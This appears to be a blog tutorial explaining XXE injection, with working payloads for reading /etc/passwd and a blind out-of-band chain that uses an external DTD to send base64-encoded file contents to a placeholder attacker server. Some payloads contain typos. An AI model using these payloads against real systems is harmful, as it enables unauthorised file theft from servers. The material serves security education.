Hi all,

In this post we will cover these following topics.

What is XXE?
How to confirm XXE?
How Exploit Basic XXE?
How Blind XXE works?
and a alternative of blind XXE payload.

But first let's understand some basic keywords.

**Entity**: Entities *reference* data that act as an abbreviation or can be found at an external location. Syntax:- **&test;**

Most common entites are:-

**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.<br>
*Syntax:-* `<!ENTITY entity_name "entity_value">`

**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by 'SYSTEM'.<br>
*Syntax:-* `<!ENTITY entity_name SYSTEM "entity_value">`

**Parameter Entity**: The purpose of a parameter entity is to enable you to create reusable sections of replacement text. (If not understood, You will understand more clearly in later.)<br>
*Syntax:-* `<!ENTITY % entity "another entity (Internal or External)">`


## What is XXE?

XXE is a short of XML External Entity, which is a vulnerablity found when misconfiguration XML parser parses enternal entities.
There are two types of XXE:- 

1. Basic.
2. Blind.

Basic one:-

For ex you have a url with a parameter that parses XML data somthing like this:- 'http://myapp.com/somefile.php?xml=<xml_data>'

Now when you provide any xml data, and that data is printing back to the user's browser then you can try basic XXE. You have to confirm the vulnerability existence and this can be done by something like this.

**Payload 1**:- 

`<?xml version="1.0"?>`<br>
`<!DOCTYPE root [`<br>
`<!ENTITY test SYSTEM 'http://yourserverip/'>]>`<br>
`<root>&test;</root>`<br>

Now let's understand this. 

1.First we declare the xml Syntax, now, we define DOCTYPE to define the contents of XML body,<br> 
2.After that, we define root element after the DOCTYPE i.e. root, next, we define the Entity and that entity contains SYSTEM attribute which indicate that the entity is External.<br>
3.After that we define our server's ip because we want to let the target server to send the request to us.

Now when you give that payload to mis-configured XML parser, the mis-configured XML parser will parse the results and it will process our External entity by **requesting to your server.**

So if you got a new connection in the log file then it is confirmed that you have found XXE.

### Now it's time to exploit it.

Our main target is to read local files of the web server and this can be done using this payload 

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,

The xml parser will process this payload as same as above but instead of requesting to your server now it will request to locally, with the file protocol, it will grep the file contents and shown to us. Hence, we can read local file of the webserver.

## What if the xml data is not showing to us? (Blind XXE Case)

Okay,

Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.

So we also needed to blind means we have to use blind payload which will grep the contents of the local files of the webserver and send the contents to our server. Sound interesting, let's see how this whole theory works and also let's see that if we have some alternatives to do that.

**Payload 2**:- 

`<?xml version="1.0"?>`<br>
`<!DOCTYPE root [`<br>
`<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]>`<br>
`<root>&entity;</root>`<br>

Your xml.dtd contents:- 

`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
`<!ENTIY % exe "<!ENTITY entity SYSTEM 'http://yourserver/%file;'>">`<br>

Lot's of code to understand:-

> we are using External dtd file i.e. `%test;`. So first the xml parser will parse this entity and make a request to your web-server for getting the contents of dtd file. Now, in that dtd file we define some entities to process. 
>
> `%exe;` will make another general entity i.e. &entity; and that entity will make a request to our server with the *file contents.* which was found by the `%file;`
>
> When the xml parser parses the entity `%file;`, then that entity will grep the file contents of local files of the server (which is our main target). 
> We are using php filter to get the file contents to bypass any restrictions.
> Now attacker can log the request and reconstruct the file contents. 

Make sense?

Let's see how all this works.

<video src="/bandicam 2018-11-04 23-35-26-024.mp4" width="320" height="200" controls preload></video>

Cool. 

Now, *Have anyone arise a question that why **we call the dtd from attacker's server?** Why not this below payload works?*

**Payload 3**:- 

`<?xml version="1.0"?>`<br>
`<!DOCTYPE root [`<br>
`<!ENTITY % filecontents SYSTEM 'file:///etc/passwd>`<br>
`<!ENTITY test SYSTEM 'http://yourserver/%filecontents;'>]>`<br>
`<root>&test;</root>`<br>

this would be easier than before? Yes it is, but it is not going to work. 

**According to [XML_DOC](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset), actually parameter entity can't be called inside the DTD subset they can be called in the External subset (like we did in Payload no 2). It will be forbidden, hence you will get the forbidden error.**

So that's the reason why we can't run above payload.

Let's try another payload:-

**Payload 4**:

`<?xml version="1.0"?>`<br>
`<!DOCTYPE root [`<br>
`<!ENTITY filecontents SYSTEM 'file:///etc/passwd>`<br>
`<!ENTITY test SYSTEM 'http://yourserver/&filecontents;'>]>`<br>
`<root>&test;</root>`<br>

So this payload works without any problem but your entity (oops, will correct it later) will act as string, because entity should be in root tag, if it is not it will act as String.

That's all guys, I just want to share because I want. :). Any thing you want to edit please tell me in the comment section.

Hope you like this read. 

Have a good hacking day.

Thanks




